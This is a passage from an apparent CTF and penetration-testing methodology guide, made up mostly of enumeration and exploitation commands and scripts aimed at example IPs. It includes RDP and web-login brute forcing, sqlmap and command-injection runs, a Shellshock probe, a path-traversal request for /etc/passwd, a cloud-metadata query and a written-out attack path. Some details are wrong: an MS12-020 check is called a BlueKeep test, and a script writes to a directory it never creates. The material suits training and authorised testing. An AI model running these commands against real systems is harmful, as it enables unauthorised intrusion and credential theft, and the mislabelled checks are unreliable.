dnsrecon -d domain.com -D /usr/share/wordlists/dns-subdomains.txt -t brt
dnsenum domain.com
fierce --domain domain.com

# Reverse DNS lookup range
dnsrecon -r 10.10.10.0/24 -n 10.10.10.100
```

**SNMP Enumeration**

```bash
# SNMP community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.100

# SNMP walk with default community
snmpwalk -v2c -c public 10.10.10.100
snmpwalk -v2c -c private 10.10.10.100

# Specific SNMP OIDs
snmpwalk -v2c -c public 10.10.10.100 1.3.6.1.2.1.1  # System info
snmpwalk -v2c -c public 10.10.10.100 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public 10.10.10.100 1.3.6.1.2.1.25.4.2.1.2  # Running processes

# SNMP enumeration script
nmap -sU -p161 --script snmp-* 10.10.10.100

# snmp-check tool
snmp-check 10.10.10.100 -c public
```

**RDP Service Enumeration**

```bash
# RDP detection
nmap -p3389 --script rdp-enum-encryption 10.10.10.100
nmap -p3389 --script rdp-ntlm-info 10.10.10.100

# Check for BlueKeep vulnerability
nmap -p3389 --script rdp-vuln-ms12-020 10.10.10.100

# RDP connection test
xfreerdp /v:10.10.10.100 /u:username /p:password

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://10.10.10.100
crowbar -b rdp -s 10.10.10.100/32 -u admin -C passwords.txt
```

**LDAP Enumeration**

```bash
# LDAP anonymous bind check
nmap -p389 --script ldap-rootdse 10.10.10.100
ldapsearch -x -h 10.10.10.100 -s base

# LDAP enumeration
ldapsearch -x -h 10.10.10.100 -b "dc=domain,dc=com"
ldapsearch -x -h 10.10.10.100 -b "dc=domain,dc=com" "(objectClass=user)"

# Using windapsearch (for AD)
python3 windapsearch.py -d domain.com --dc-ip 10.10.10.100 -U
```

**NFS Enumeration**

```bash
# Show NFS exports
showmount -e 10.10.10.100
nmap -p111 --script nfs-* 10.10.10.100

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs 10.10.10.100:/share /mnt/nfs -o nolock

# List NFS shares with permissions
nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.100
```

**Comprehensive Service Identification Script**

```bash
#!/bin/bash
# service_enum.sh - Identify and enumerate all services

TARGET=$1
PORTS=$(nmap -p- --min-rate=1000 $TARGET | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

echo "[*] Enumerating services on $TARGET"
echo "[*] Open ports: $PORTS"

# Service version detection
nmap -p$PORTS -sV -sC -oA service_enum $TARGET

# Parse results and enumerate specific services
while IFS= read -r line; do
    if echo "$line" | grep -q "21/tcp.*ftp"; then
        echo "[*] FTP detected, checking anonymous access..."
        nmap -p21 --script ftp-anon $TARGET
    fi
    
    if echo "$line" | grep -q "22/tcp.*ssh"; then
        echo "[*] SSH detected, grabbing banner..."
        nc -nv $TARGET 22 2>&1 | head -1
    fi
    
    if echo "$line" | grep -q "80/tcp\|443/tcp.*http"; then
        echo "[*] HTTP detected, enumerating directories..."
        gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -q
    fi
    
    if echo "$line" | grep -q "445/tcp.*smb"; then
        echo "[*] SMB detected, enumerating shares..."
        smbmap -H $TARGET
    fi
    
    if echo "$line" | grep -q "3306/tcp.*mysql"; then
        echo "[*] MySQL detected, checking version..."
        nmap -p3306 --script mysql-info $TARGET
    fi
    
done < service_enum.nmap
```

### Vulnerability Cataloging

**Automated Vulnerability Scanners**

```bash
# Nmap vulnerability scripts
nmap --script vuln -p$PORTS 10.10.10.100 -oA vuln_scan

# Specific vulnerability checks
nmap -p445 --script smb-vuln-ms17-010 10.10.10.100  # EternalBlue
nmap -p22 --script ssh-vulnkey 10.10.10.100
nmap -p80,443 --script http-shellshock 10.10.10.100

# Nikto web vulnerability scanner
nikto -h http://10.10.10.100 -output nikto_scan.txt

# Comprehensive Nikto scan
nikto -h http://10.10.10.100 -Tuning 123456789x -Format htm -o nikto_full.html

# OpenVAS/GVM (requires setup)
# Web-based vulnerability scanner
```

**Web Application Vulnerability Scanning**

```bash
# SQL injection detection
sqlmap -u "http://10.10.10.100/page.php?id=1" --batch --dbs

# SQLmap with authentication
sqlmap -u "http://10.10.10.100/admin" --cookie="PHPSESSID=abc123" --dbs

# XSS scanning
dalfox url http://10.10.10.100/search?q=test

# Command injection testing
commix --url="http://10.10.10.100/exec?cmd=test"

# File inclusion testing
fimap -u "http://10.10.10.100/page.php?file=index"

# SSRF testing
python3 ssrfdetector.py -u http://10.10.10.100

# Web application firewall detection
wafw00f http://10.10.10.100

# Comprehensive web vulnerability scan with wpscan (WordPress)
wpscan --url http://10.10.10.100 --enumerate u,p,t --api-token YOUR_TOKEN

# Joomla scanner
joomscan -u http://10.10.10.100

# Drupal scanner
droopescan scan drupal -u http://10.10.10.100
```

**Manual Vulnerability Assessment**

```bash
# Check for default credentials
# Create credentials list
cat > default_creds.txt << EOF
admin:admin
admin:password
root:root
root:toor
administrator:administrator
EOF

# Test credentials with hydra
hydra -C default_creds.txt http-post-form://10.10.10.100/login.php:"username=^USER^&password=^PASS^:Invalid"

# Check for common vulnerabilities
# Heartbleed (CVE-2014-0160)
nmap -p443 --script ssl-heartbleed 10.10.10.100

# Shellshock (CVE-2014-6271)
curl -H "User-Agent: () { :; }; echo vulnerable" http://10.10.10.100/cgi-bin/test.sh

# Check for outdated software versions
# Compare against CVE databases
searchsploit <service> <version>
```

**Exploit Database Searches**

```bash
# SearchSploit (offline exploit-db)
searchsploit apache 2.4.49
searchsploit -m 12345  # Mirror exploit locally
searchsploit -x 12345  # Examine exploit

# Search by platform
searchsploit --platform linux kernel

# Search with CVE
searchsploit CVE-2021-41773

# Update exploit database
searchsploit -u

# Online searches
# https://www.exploit-db.com
# https://nvd.nist.gov
# https://cve.mitre.org
```

**Metasploit Vulnerability Detection**

```bash
msfconsole

# Search for modules
msf6 > search type:exploit platform:linux

# Search by CVE
msf6 > search cve:2021 type:exploit

# Use auxiliary scanner modules
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 > set RHOSTS 10.10.10.100
msf6 > run

# SMB vulnerability scan
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.10.10.100
msf6 > run

# Version-based vulnerability search
msf6 > search apache 2.4
```

**CVE Tracking and Management**

```bash
# CVE Details API
curl "https://cve.circl.lu/api/search/apache/2.4.49"

# Using cve-search locally
# Install: https://github.com/cve-search/cve-search
python3 search.py -p apache -v 2.4.49

# Vulnerability priority scoring
# CVSS calculator
# Focus on: CVSS >= 7.0 (High/Critical)
```

**Vulnerability Documentation Template**

````markdown
# Vulnerability Report: [Service/Application]

## Target Information
- IP Address: 10.10.10.100
- Port: 80/TCP
- Service: Apache 2.4.49

## Vulnerability Details
- CVE ID: CVE-2021-41773
- CVSS Score: 7.5 (High)
- Type: Path Traversal
- Description: [Brief description]

## Proof of Concept
```bash
curl http://10.10.10.100/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
````

### Impact

- File disclosure
- Remote code execution potential

### Remediation

- Upgrade to Apache 2.4.51
- Apply security patches

### References

- https://nvd.nist.gov/vuln/detail/CVE-2021-41773
- https://www.exploit-db.com/exploits/50383


### Attack Surface Mapping

**Entry Point Identification**

```bash
# Map all accessible services
nmap -p- -sV -sC --open 10.10.10.100 -oA attack_surface

# Web application attack surface
# Identify forms
curl -s http://10.10.10.100 | grep -i "<form"

# Identify input parameters
python3 paramspider.py -d 10.10.10.100

# Extract URLs and endpoints
gospider -s http://10.10.10.100 -o output -c 10 -d 3

# JavaScript file analysis
python3 LinkFinder.py -i http://10.10.10.100 -o results.html

# API endpoint discovery
kiterunner scan http://10.10.10.100 -w routes.kite
````

**Authentication Mechanism Analysis**

```bash
# Identify authentication methods
curl -I http://10.10.10.100/admin

# Check for:
# - Basic Auth (WWW-Authenticate: Basic)
# - Digest Auth
# - Form-based authentication
# - Token-based (JWT, OAuth)
# - Certificate-based

# Session management analysis
# Check cookies
curl -I http://10.10.10.100/login

# Test session fixation
# Test session timeout
# Test concurrent sessions
```

**Network Attack Surface**

```bash
# Full TCP/UDP port scan
sudo nmap -sS -sU -p- 10.10.10.100 -oA full_scan

# Identify filtering
nmap -sA -p1-65535 10.10.10.100  # ACK scan for firewall rules

# Identify load balancers/proxies
hping3 -S 10.10.10.100 -p 80 -c 5

# Check for additional interfaces
nmap -sn 10.10.10.0/24
nmap -sn 192.168.1.0/24

# IPv6 enumeration
nmap -6 fe80::1

# Internal network discovery (if pivoted)
for i in {1..254}; do ping -c 1 -W 1 172.16.0.$i & done
```

**File System Attack Surface**

```bash
# Writable directories
find / -writable -type d 2>/dev/null
find / -perm -2 -type d 2>/dev/null

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# World-readable sensitive files
find /etc -readable -type f 2>/dev/null
find /var -readable -type f 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null

# Configuration files
find / -name "*.conf" -o -name "*.config" 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
```

**User and Permission Mapping**

```bash
# Enumerate users
cat /etc/passwd
cat /etc/group

# Identify privileged users
awk -F: '($3 == "0") {print}' /etc/passwd

# Check sudo permissions
sudo -l

# Find files owned by specific user
find / -user www-data 2>/dev/null

# Group memberships
id
groups

# Capability enumeration
getcap -r / 2>/dev/null
```

**Application Logic Mapping**

```bash
# Sitemap generation
python3 dirsearch.py -u http://10.10.10.100 -e php,html,js --simple-report=sitemap.txt

# Crawl and map
burpsuite  # Use Spider tool
zaproxy  # Use Spider tool

# API documentation discovery
# Check for:
# - /api/docs
# - /swagger
# - /swagger-ui
# - /api/swagger.json
# - /graphql
# - /api/v1

curl http://10.10.10.100/swagger.json | jq
```

**Trust Boundary Identification**

```bash
# Identify network zones
# DMZ vs Internal
# Web tier vs Database tier
# User segments

# Test cross-zone access
# Can web server access database directly?
# Can DMZ access internal networks?

# Active Directory trust relationships
nltest /domain_trusts
Get-ADTrust -Filter *

# Cloud metadata endpoints (if applicable)
curl http://169.254.169.254/latest/meta-data/
```

**Attack Surface Visualization Script**

```python
#!/usr/bin/env python3
import nmap
import json

def map_attack_surface(target):
    """
    [Inference] - Creates attack surface map based on discovered services
    """
    scanner = nmap.PortScanner()
    
    print(f"[*] Mapping attack surface for {target}")
    
    # Comprehensive scan
    scanner.scan(target, arguments='-sV -sC -p- --open')
    
    attack_surface = {
        'target': target,
        'services': [],
        'entry_points': [],
        'attack_vectors': []
    }
    
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            
            for port in ports:
                service = scanner[host][proto][port]
                
                service_info = {
                    'port': port,
                    'protocol': proto,
                    'state': service['state'],
                    'name': service['name'],
                    'product': service.get('product', ''),
                    'version': service.get('version', ''),
                    'extrainfo': service.get('extrainfo', '')
                }
                
                attack_surface['services'].append(service_info)
                
                # Identify entry points
                if service['name'] in ['http', 'https']:
                    attack_surface['entry_points'].append({
                        'type': 'web',
                        'port': port,
                        'url': f"http{'s' if service['name'] == 'https' else ''}://{target}:{port}"
                    })
                
                elif service['name'] == 'ssh':
                    attack_surface['entry_points'].append({
                        'type': 'ssh',
                        'port': port
                    })
                
                elif service['name'] in ['smb', 'microsoft-ds']:
                    attack_surface['entry_points'].append({
                        'type': 'smb',
                        'port': port
                    })
                
                # Map attack vectors
                attack_vectors = identify_attack_vectors(service_info)
                attack_surface['attack_vectors'].extend(attack_vectors)
    
    return attack_surface

def identify_attack_vectors(service_info):
    """
    [Inference] - Identifies potential attack vectors based on service type
    """
    vectors = []
    
    service_name = service_info['name']
    version = service_info.get('version', '')
    
    if service_name in ['http', 'https']:
        vectors.append({
            'service': service_name,
            'port': service_info['port'],
            'vectors': [
                'Directory traversal',
                'SQL injection',
                'XSS',
                'File upload',
                'Command injection',
                'Authentication bypass'
            ]
        })
    
    elif service_name == 'ssh':
        vectors.append({
            'service': service_name,
            'port': service_info['port'],
            'vectors': [
                'Weak credentials',
                'Public key authentication',
                'User enumeration',
                'Version-specific exploits'
            ]
        })
    
    elif service_name in ['smb', 'microsoft-ds']:
        vectors.append({
            'service': service_name,
            'port': service_info['port'],
            'vectors': [
                'NULL session',
                'SMB relay',
                'EternalBlue (MS17-010)',
                'Share enumeration',
                'Credential stuffing'
            ]
        })
    
    elif service_name == 'ftp':
        vectors.append({
            'service': service_name,
            'port': service_info['port'],
            'vectors': [
                'Anonymous login',
                'Weak credentials',
                'Directory traversal',
                'Buffer overflow'
            ]
        })
    
    elif service_name in ['mysql', 'postgresql', 'mssql', 'mongodb']:
        vectors.append({
            'service': service_name,
            'port': service_info['port'],
            'vectors': [
                'Default credentials',
                'SQL injection',
                'Privilege escalation',
                'UDF exploitation'
            ]
        })
    
    return vectors

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 attack_surface_mapper.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    surface = map_attack_surface(target)
    
    # Output results
    print("\n[+] Attack Surface Map\n")
    print(f"Target: {surface['target']}")
    print(f"\nDiscovered Services: {len(surface['services'])}")
    
    for service in surface['services']:
        print(f"\n  Port {service['port']}/{service['protocol']}")
        print(f"    Service: {service['name']}")
        if service['product']:
            print(f"    Product: {service['product']} {service['version']}")
    
    print(f"\n[+] Entry Points: {len(surface['entry_points'])}")
    for entry in surface['entry_points']:
        print(f"  - {entry['type'].upper()} on port {entry['port']}")
        if entry['type'] == 'web':
            print(f"    URL: {entry['url']}")
    
    print(f"\n[+] Attack Vectors:")
    for vector_group in surface['attack_vectors']:
        print(f"\n  {vector_group['service']} (Port {vector_group['port']})")
        for vector in vector_group['vectors']:
            print(f"    • {vector}")
    
    # Save to JSON
    with open(f'attack_surface_{target}.json', 'w') as f:
        json.dump(surface, indent=2, fp=f)
    
    print(f"\n[+] Full report saved to: attack_surface_{target}.json")
```

**Data Flow Analysis**

```bash
# Identify data flows between services
# Network traffic analysis with tcpdump
sudo tcpdump -i eth0 -w capture.pcap host 10.10.10.100

# Analyze captured traffic
wireshark capture.pcap
tshark -r capture.pcap -Y "http.request"

# Monitor real-time connections
netstat -tupan
ss -tupan

# Process monitoring
ps aux
top -b -n 1

# Identify listening services and their processes
lsof -i -P -n
netstat -tulpn

# Trace system calls
strace -p <PID> -f -e trace=network

# Application flow analysis
# Map user input → processing → output
# Identify data transformations
# Check for validation/sanitization
```

**Comprehensive Attack Surface Report Template**

```markdown
# Attack Surface Analysis Report

## Executive Summary
Target: 10.10.10.100
Scan Date: 2025-10-12
Total Open Ports: 15
Critical Entry Points: 3

## Network Surface

### Open Ports and Services

| Port | Protocol | Service | Version | State |
|------|----------|---------|---------|-------|
| 22   | TCP      | SSH     | OpenSSH 7.6p1 | Open |
| 80   | TCP      | HTTP    | Apache 2.4.29 | Open |
| 445  | TCP      | SMB     | Samba 4.7.6 | Open |
| 3306 | TCP      | MySQL   | 5.7.33 | Open |

### Network Topology
```

Internet → [Firewall] → DMZ [10.10.10.100] → Internal Network [172.16.0.0/24]

```

## Entry Points

### 1. Web Application (Port 80/443)
- **URL**: http://10.10.10.100
- **Technology Stack**: PHP 7.2, Apache 2.4.29, MySQL 5.7
- **Authentication**: Form-based login
- **Input Vectors**:
  - Login form: username, password
  - Search functionality: query parameter
  - File upload: /upload.php
  - Contact form: name, email, message

### 2. SSH Service (Port 22)
- **Version**: OpenSSH 7.6p1
- **Authentication Methods**: Password, Public Key
- **User Enumeration**: Possible (timing-based)

### 3. SMB Service (Port 445)
- **Version**: Samba 4.7.6
- **Shares Discovered**: 
  - IPC$ (NULL session allowed)
  - Users (Read access)
  - Admin$ (No access)

## Attack Vectors by Priority

### Critical Vectors
1. **SQL Injection** (Port 80)
   - Location: /search.php?query=
   - Evidence: Error-based SQLi detected
   - Impact: Database access, potential RCE

2. **SMB NULL Session** (Port 445)
   - Location: //10.10.10.100/IPC$
   - Evidence: Anonymous enumeration allowed
   - Impact: User enumeration, share listing

### High-Risk Vectors
1. **File Upload** (Port 80)
   - Location: /upload.php
   - Evidence: Inadequate file type validation
   - Impact: Web shell upload, RCE

2. **Default Credentials** (Port 3306)
   - Location: MySQL service
   - Evidence: Common credentials not tested yet
   - Impact: Database compromise

### Medium-Risk Vectors
1. **SSH Brute Force** (Port 22)
   - Location: SSH service
   - Evidence: No rate limiting detected
   - Impact: Account compromise

2. **Directory Traversal** (Port 80)
   - Location: /download.php?file=
   - Evidence: Not tested yet
   - Impact: File disclosure

## Trust Boundaries

### External → DMZ
- Firewall allows: 80, 443, 22
- Filtered: All other ports

### DMZ → Internal
- Web server has access to:
  - Database server (172.16.0.10:3306)
  - File server (172.16.0.20:445)

## Credentials Found
- None yet

## Configuration Issues
1. Directory listing enabled on /uploads/
2. Server version disclosure in HTTP headers
3. Weak SSL/TLS configuration (Port 443)

## Recommended Attack Path
1. Exploit SQL injection to extract credentials
2. Use credentials to access SMB shares
3. Search for sensitive files in shares
4. Attempt privilege escalation via uploaded files
5. Pivot to internal network

## Tools Used
- Nmap 7.93
- Gobuster 3.6
- SQLMap 1.7
- Enum4linux 0.9
- Nikto 2.5.0

## Next Steps
1. Deep dive into SQL injection exploitation
2. Manual testing of file upload functionality
3. Enumerate SMB shares for sensitive data
4. Test for privilege escalation vectors
5. Map internal network (if access obtained)
```

**Automated Reconnaissance Workflow**

```bash
#!/bin/bash
# comprehensive_recon.sh - Complete reconnaissance workflow

TARGET=$1
DOMAIN=$2
OUTPUT_DIR="recon_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [domain]"
    exit 1
fi

mkdir -p $OUTPUT_DIR/{nmap,web,smb,dns,vulnerabilities}
cd $OUTPUT_DIR

echo "[*] Starting comprehensive reconnaissance on $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# ============================================
# PHASE 1: HOST DISCOVERY
# ============================================
echo -e "\n[*] PHASE 1: Host Discovery"

# Quick ping check
ping -c 1 $TARGET &>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] Host is alive"
else
    echo "[-] Host appears down, proceeding anyway..."
fi

# ============================================
# PHASE 2: PORT SCANNING
# ============================================
echo -e "\n[*] PHASE 2: Port Scanning"

# Quick scan for open ports
echo "[*] Running quick port discovery..."
nmap -p- --min-rate=1000 -T4 $TARGET -oN nmap/quick_scan.txt

# Extract open ports
PORTS=$(grep -oP '\d+/open' nmap/quick_scan.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')

if [ -z "$PORTS" ]; then
    echo "[-] No open ports found!"
    exit 1
fi

echo "[+] Open ports: $PORTS"

# Detailed scan on open ports
echo "[*] Running detailed service scan..."
nmap -p$PORTS -sV -sC -A -T4 $TARGET -oA nmap/detailed_scan

# UDP scan (top 100 ports)
echo "[*] Running UDP scan..."
sudo nmap -sU --top-ports 100 $TARGET -oA nmap/udp_scan &

# ============================================
# PHASE 3: SERVICE ENUMERATION
# ============================================
echo -e "\n[*] PHASE 3: Service Enumeration"

# Check for HTTP/HTTPS
if echo $PORTS | grep -qE "80|443|8080|8443"; then
    echo "[*] HTTP service detected - Starting web enumeration..."
    
    # Determine protocol
    if echo $PORTS | grep -q "443\|8443"; then
        PROTOCOL="https"
    else
        PROTOCOL="http"
    fi
    
    # Technology detection
    echo "[*] Detecting web technologies..."
    whatweb -a 3 $PROTOCOL://$TARGET > web/whatweb.txt
    
    # Directory enumeration
    echo "[*] Starting directory brute force..."
    gobuster dir -u $PROTOCOL://$TARGET \
        -w /usr/share/wordlists/dirb/common.txt \
        -x php,html,txt,bak \
        -o web/gobuster.txt \
        -t 50 &
    
    # Nikto scan
    echo "[*] Running Nikto scan..."
    nikto -h $PROTOCOL://$TARGET -output web/nikto.txt &
fi

# Check for SMB
if echo $PORTS | grep -q "445\|139"; then
    echo "[*] SMB service detected - Starting SMB enumeration..."
    
    # Enum4linux
    enum4linux -a $TARGET > smb/enum4linux.txt
    
    # SMB shares
    smbmap -H $TARGET > smb/smbmap.txt
    
    # SMB vulnerability scan
    nmap -p445 --script smb-vuln* $TARGET -oN smb/vuln_scan.txt
fi

# Check for FTP
if echo $PORTS | grep -q "21"; then
    echo "[*] FTP service detected - Checking anonymous access..."
    nmap -p21 --script ftp-anon $TARGET -oN nmap/ftp_anon.txt
fi

# Check for SSH
if echo $PORTS | grep -q "22"; then
    echo "[*] SSH service detected - Grabbing banner..."
    nc -nv $TARGET 22 2>&1 | head -5 > nmap/ssh_banner.txt
fi

# Check for DNS
if [ ! -z "$DOMAIN" ] && echo $PORTS | grep -q "53"; then
    echo "[*] DNS service detected - Attempting zone transfer..."
    dig axfr @$TARGET $DOMAIN > dns/zone_transfer.txt
    
    # Subdomain enumeration
    dnsrecon -d $DOMAIN -n $TARGET > dns/dnsrecon.txt
fi

# Check for SNMP
if echo $PORTS | grep -q "161"; then
    echo "[*] SNMP service detected - Enumerating..."
    snmpwalk -v2c -c public $TARGET > snmp/snmpwalk.txt 2>&1
fi

# Check for MySQL/MariaDB
if echo $PORTS | grep -q "3306"; then
    echo "[*] MySQL service detected - Checking version..."
    nmap -p3306 --script mysql-info $TARGET -oN nmap/mysql_info.txt
fi

# Check for RDP
if echo $PORTS | grep -q "3389"; then
    echo "[*] RDP service detected - Checking security..."
    nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption $TARGET -oN nmap/rdp_info.txt
fi

# ============================================
# PHASE 4: VULNERABILITY SCANNING
# ============================================
echo -e "\n[*] PHASE 4: Vulnerability Scanning"

# Nmap vuln scripts
echo "[*] Running vulnerability scripts..."
nmap -p$PORTS --script vuln $TARGET -oA vulnerabilities/vuln_scan

# SearchSploit lookups
echo "[*] Searching exploit database..."
while IFS= read -r line; do
    if echo "$line" | grep -qE "^[0-9]+/tcp.*open"; then
        SERVICE=$(echo "$line" | awk '{print $3}')
        VERSION=$(echo "$line" | grep -oP '\d+\.\d+(\.\d+)?' | head -1)
        
        if [ ! -z "$SERVICE" ] && [ ! -z "$VERSION" ]; then
            echo "[*] Searching exploits for $SERVICE $VERSION..."
            searchsploit "$SERVICE $VERSION" >> vulnerabilities/exploits.txt 2>/dev/null
        fi
    fi
done < nmap/detailed_scan.nmap

# ============================================
# PHASE 5: ATTACK SURFACE MAPPING
# ============================================
echo -e "\n[*] PHASE 5: Attack Surface Mapping"

cat > attack_surface.md << EOF
# Attack Surface Report for $TARGET

## Scan Information
- Date: $(date)
- Target: $TARGET
- Domain: ${DOMAIN:-N/A}

## Open Ports
$(cat nmap/quick_scan.txt | grep -E "^[0-9]+" | head -20)

## Services Identified
$(cat nmap/detailed_scan.nmap | grep -E "^[0-9]+/(tcp|udp).*open" | head -20)

## Entry Points Discovered
EOF

# Add web entry points
if [ -f web/gobuster.txt ]; then
    echo -e "\n### Web Application Entry Points" >> attack_surface.md
    cat web/gobuster.txt | grep "Status: 200" | head -10 >> attack_surface.md
fi

# Add SMB entry points
if [ -f smb/smbmap.txt ]; then
    echo -e "\n### SMB Shares" >> attack_surface.md
    cat smb/smbmap.txt >> attack_surface.md
fi

# Wait for background jobs
echo -e "\n[*] Waiting for background scans to complete..."
wait

# ============================================
# PHASE 6: REPORTING
# ============================================
echo -e "\n[*] PHASE 6: Generating Report"

# Create summary
cat > SUMMARY.txt << EOF
====================================
RECONNAISSANCE SUMMARY
====================================
Target: $TARGET
Scan Date: $(date)
Output Directory: $OUTPUT_DIR

OPEN PORTS:
$(echo $PORTS | tr ',' '\n')

KEY FINDINGS:
- Total open TCP ports: $(echo $PORTS | tr ',' '\n' | wc -l)
- HTTP/HTTPS: $(echo $PORTS | grep -qE "80|443|8080" && echo "YES" || echo "NO")
- SMB: $(echo $PORTS | grep -q "445" && echo "YES" || echo "NO")
- SSH: $(echo $PORTS | grep -q "22" && echo "YES" || echo "NO")
- FTP: $(echo $PORTS | grep -q "21" && echo "YES" || echo "NO")
- Database: $(echo $PORTS | grep -qE "3306|5432|1433" && echo "YES" || echo "NO")

RECOMMENDED NEXT STEPS:
EOF

# Add recommendations based on findings
if echo $PORTS | grep -q "80\|443"; then
    echo "1. Deep dive into web application testing" >> SUMMARY.txt
    echo "   - Manual testing of discovered forms" >> SUMMARY.txt
    echo "   - Parameter fuzzing" >> SUMMARY.txt
    echo "   - Check for SQLi, XSS, file upload vulns" >> SUMMARY.txt
fi

if echo $PORTS | grep -q "445"; then
    echo "2. SMB enumeration and exploitation" >> SUMMARY.txt
    echo "   - Test NULL session access" >> SUMMARY.txt
    echo "   - Check for EternalBlue vulnerability" >> SUMMARY.txt
    echo "   - Attempt relay attacks" >> SUMMARY.txt
fi

if echo $PORTS | grep -q "22"; then
    echo "3. SSH access attempts" >> SUMMARY.txt
    echo "   - Test for weak credentials" >> SUMMARY.txt
    echo "   - Check for user enumeration" >> SUMMARY.txt
fi

echo -e "\nFull details available in subdirectories:" >> SUMMARY.txt
echo "  - nmap/     : Port scan results" >> SUMMARY.txt
echo "  - web/      : Web enumeration" >> SUMMARY.txt
echo "  - smb/      : SMB enumeration" >> SUMMARY.txt
echo "  - dns/      : DNS information" >> SUMMARY.txt
echo "  - vulnerabilities/ : Vulnerability scans" >> SUMMARY.txt

# Display summary
cat SUMMARY.txt

echo -e "\n[+] Reconnaissance complete!"
echo "[+] Results saved to: $(pwd)"
```

**Quick Reference: Reconnaissance Checklist**

```bash
# RECONNAISSANCE CHECKLIST

## 1. Host Discovery
□ Ping sweep
□ ARP scan (local network)
□ Port discovery scan

## 2. Port Scanning
□ Quick TCP scan (all ports)
□ Detailed TCP scan (open ports only)
□ UDP scan (top 100-1000 ports)
□ Service version detection
□ OS fingerprinting

## 3. Service Enumeration
□ HTTP/HTTPS
  □ Technology detection (whatweb/wappalyzer)
  □ Directory enumeration (gobuster/feroxbuster)
  □ Vulnerability scanning (nikto)
  □ Spider/crawl (burp/zap)
  □ SSL/TLS testing

□ SMB (445, 139)
  □ Share enumeration (smbmap)
  □ User enumeration (enum4linux)
  □ Null session testing
  □ Vulnerability scanning

□ FTP (21)
  □ Anonymous login check
  □ Directory listing
  □ Version check

□ SSH (22)
  □ Banner grabbing
  □ Algorithm enumeration
  □ User enumeration

□ DNS (53)
  □ Zone transfer attempt
  □ Subdomain enumeration
  □ Record enumeration

□ SNMP (161/162)
  □ Community string brute force
  □ SNMP walk
  □ OID enumeration

□ Database Services
  □ MySQL (3306)
  □ PostgreSQL (5432)
  □ MSSQL (1433)
  □ MongoDB (27017)
  □ Redis (6379)

## 4. Vulnerability Assessment
□ Automated scanning (nmap scripts)
□ Service-specific scanners
□ Version-based exploit search
□ CVE database lookup
□ Default credentials testing

## 5. Attack Surface Mapping
□ Entry point identification
□ Trust boundary mapping
□ Data flow analysis
□ Authentication mechanism review
□ Authorization testing
□ Session management review

## 6. Documentation
□ Create target profile
□ Document all findings
□ Prioritize vulnerabilities
□ Map attack paths
□ Generate comprehensive report
```

---

**Important CTF-Specific Considerations:**

- Time management is critical - prioritize quick wins
- Look for intentional hints in service banners, HTTP headers, HTML comments
- Always check for hidden directories: .git, .svn, backup files
- Enumerate thoroughly before exploitation - missing information costs time
- Document everything - you may need to backtrack
- Check for multiple vulnerabilities - CTFs often chain exploits
- Don't overlook unusual port numbers or non-standard services
- Service versions are often hints - research known exploits immediately
- Save all reconnaissance data - it's valuable throughout the engagement

---

## CTF Exploitation Phase

### Prioritization of Exploits

Effective exploit prioritization maximizes success probability while minimizing time investment. Prioritization follows a risk-reward assessment based on exploit reliability, complexity, and potential impact.

**Exploitation Priority Framework:**

```bash
# Priority 1: Known CVEs with Public Exploits (Metasploit/ExploitDB)
# Characteristics: High success rate, minimal modification required
# Time investment: 5-15 minutes per attempt

searchsploit [service_name] [version]
msfconsole -q -x "search [service_name]; use [exploit]; show options"

# Verify version match exactly
nmap -sV --version-intensity 9 192.168.1.10 -p [port]

# Priority 2: Default Credentials and Common Misconfigurations
# Characteristics: Immediate access, no exploit development needed
# Time investment: 2-5 minutes per service

hydra -C /usr/share/seclists/Passwords/Default-Credentials/[service]-betterdefaultpasslist.txt \
    192.168.1.10 [protocol]

# Priority 3: Known Vulnerability Patterns (SQLi, RCE, File Upload)
# Characteristics: Medium complexity, proven techniques
# Time investment: 10-30 minutes

# Priority 4: Configuration Weaknesses (Weak Permissions, Exposed Services)
# Characteristics: Reliable but requires enumeration
# Time investment: 15-45 minutes

# Priority 5: Complex Exploitation Chains
# Characteristics: Multiple steps, higher failure rate
# Time investment: 30+ minutes
```

**Exploit Triage Decision Tree:**

```bash
#!/bin/bash
# Automated exploit prioritization script

target=$1
services_file="nmap_services.txt"

echo "[*] Analyzing exploitation opportunities for $target"

# Extract service versions
nmap -sV -sC -oN $services_file $target

# Priority 1: Critical RCE vulnerabilities
echo "=== Priority 1: Critical RCE ==="
grep -iE "vsftpd 2.3.4|ProFTPD 1.3.3c|Apache 2.4.49|Shellshock" $services_file && \
    echo "[!] CRITICAL: Immediate RCE available"

# Priority 2: Authentication bypass
echo "=== Priority 2: Auth Bypass ==="
grep -iE "tomcat|webmin|phpmyadmin" $services_file && \
    echo "[+] Check default credentials"

# Priority 3: Known privilege escalation paths
echo "=== Priority 3: Initial Access Vectors ==="
grep -iE "ssh|ftp|smb|rdp" $services_file && \
    echo "[+] Brute force candidates identified"

# Priority 4: Information disclosure
echo "=== Priority 4: Information Disclosure ==="
grep -iE "http|https" $services_file && \
    echo "[+] Web enumeration required"

# Priority 5: Complex chains
echo "=== Priority 5: Research Required ==="
grep -vE "ssh|http|ftp|smb|mysql" $services_file | grep "open" && \
    echo "[*] Uncommon services - manual analysis needed"
```

**Exploit Selection Criteria:**
